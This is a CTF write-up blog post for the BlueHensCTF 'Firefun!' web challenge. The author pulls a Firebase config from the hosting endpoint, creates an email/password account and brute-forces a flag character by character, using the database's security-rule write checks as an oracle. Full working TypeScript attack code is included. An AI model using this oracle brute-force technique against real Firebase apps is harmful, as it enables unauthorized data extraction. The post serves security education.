---
layout: post
current: post
cover:  False
navigation: True
title: "Firefun!"
date: 2022-11-03 10:00:00
tags: [BlueHensCTF, web]
class: post-template
subclass: 'post'
author: nisala
---

I love Firebase. So this really was the perfect challenge for me.

Special shoutout to Kyle for working on this with me ❤️

## The Challenge

In this challenge, we get a [link to a Firebase-hosted website](https://udctf-fire.web.app/), which displays the following image:

![Image showing Firebase RTDB with the flag and the rules for the database](/assets/bluehens/nisala/rules.webp)

Okay, so it looks the flag is stored character-by-character in Realtime Database (RTDB), and the security rules block us from reading it directly. However, if we're authenticated, we can write to `/oracle/$userid/$index`, and if the written character at $index maches the character at $index at `/flag`, the write succeeds. Otherwise, the write fails. So assuming we can authenticate, we can brute-force the flag character-by-character, cycling through some character set until the write succeeds for each index.

## Getting Authenticated

So to start, we need to authenticate. But how can we do that without a Firebase API key? Well, this website is hosted on Firebase, and by default, Firebase Hosting exposes a web API key and related config at `/__/firebase/init.json`. When we go there, we get the following output:

```json
{
  "apiKey": "AIzaSyDmLIX31LAFvb1hefXs-e6Baspcfg6ran8",
  "authDomain": "udctf-fire.firebaseapp.com",
  "databaseURL": "https://udctf-fire-default-rtdb.firebaseio.com",
  "messagingSenderId": "272888152617",
  "projectId": "udctf-fire",
  "storageBucket": "udctf-fire.appspot.com"
}
```

Perfect. Now, we can authenticate and solve the challenge. In order to make things easier on myself, I created a React App, so that way I can use the Firebase JS SDK to authenticate and work with the databse. You can create a React App using `npx create-react-app firefun --template typescript`, and then you can install the Firebase SDK by running `npm install firebase`.

And now it's time to try to authenticate. There are three types of sign-up that are Firebase-native and thus don't require API keys from third parties -- Anonymous, Email/Password, and Phone. I first tried anonymous login, since it was the easiest:

```tsx
// App.tsx
import { initializeApp } from "firebase/app";
import { getAuth, signInAnonymously } from "firebase/auth";

initializeApp({
    "apiKey": "AIzaSyDmLIX31LAFvb1hefXs-e6Baspcfg6ran8",
    "authDomain": "udctf-fire.firebaseapp.com",
    "databaseURL": "https://udctf-fire-default-rtdb.firebaseio.com",
    "messagingSenderId": "272888152617",
    "projectId": "udctf-fire",
    "storageBucket": "udctf-fire.appspot.com"
});

signInAnonymously(getAuth());
```

Checking the console, we see `Firebase: Error (auth/admin-restricted-operation).`. Rats. Well, let's try email/password:

```js
createUserWithEmailAndPassword(getAuth(), "avishkank@gmail.com", "password");
```

No error in the console -- it works! Now that we have a working user, we can start brute-forcing the flag.

## Getting the Flag

To brute-force the flag, we need to loop through a character set of all possible characters in the flag, and try writing them one by one. If it fails, that's not the character at that index -- but if it succeeds, we've found it, and we can save it and move on.

```tsx
// cred is from the signInWithEmailAndPassword function
const uid = cred.user.uid;
let db = getDatabase();

let flag = [];
const CHAR_SET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_";
let i = 0;
while (flag[flag.length - 1] !== "}") {
    for (let char of CHAR_SET.split("")) {
        try {
            await set(ref(db, `/oracle/${uid}/${i}`), char);
            flag.push(char);
            i++;
            break;
        } catch {}
    }
}
```

Now that this challenge is pretty straightforward, it's time to add some flair. We have a React app, after all! Let's write the flag to a React state variable as we go, and put this code in a `useEffect` so it runs when the page loads:

```tsx
const [finalFlag, setFinalFlag] = useState<string[]>([]);

useEffect(() => {
    signInWithEmailAndPassword(getAuth(), "avishkank@gmail.com", "password").then(async (cred) => {
        const uid = cred.user.uid;
        let db = getDatabase();

        let flag = [];
        const CHAR_SET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_";
        let i = 0;
        while (flag[flag.length - 1] !== "}") {
            for (let char of CHAR_SET.split("")) {
                try {
                    await set(ref(db, `/oracle/${uid}/${i}`), char);
                    flag.push(char);
                    setFinalFlag(flag);
                    i++;
                    break;
                } catch {}
            }
        }
    });
}, []);
```

And finally, instead of the boring, default React app text, we can display the flag as it's being brute-forced:

```tsx
{ finalFlag.length > 0 ? finalFlag.join("") : "Starting up..." }
```

And now all we have to do is open the React app and watch it brute-force the flag in real time.

![GIF of solution](/assets/bluehens/nisala/solve.gif)
